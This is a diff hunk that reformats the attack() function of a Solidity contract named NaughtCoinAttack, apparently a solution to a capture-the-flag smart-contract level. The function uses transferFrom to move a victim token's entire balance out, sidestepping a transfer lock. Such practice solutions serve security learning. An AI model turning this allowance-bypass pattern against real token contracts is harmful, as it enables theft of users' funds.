@@ -17,11 +17,8 @@ contract NaughtCoinAttack {
      */
     function attack() external {
         require(
-            victimNaughtCoin.transferFrom(
-                msg.sender,
-                address(this),
-                victimNaughtCoin.balanceOf(msg.sender)
-            ) && 0 == victimNaughtCoin.balanceOf(msg.sender),
+            victimNaughtCoin.transferFrom(msg.sender, address(this), victimNaughtCoin.balanceOf(msg.sender)) &&
+                0 == victimNaughtCoin.balanceOf(msg.sender),
             "NaughtCoin: Attack failed"
         );
     }
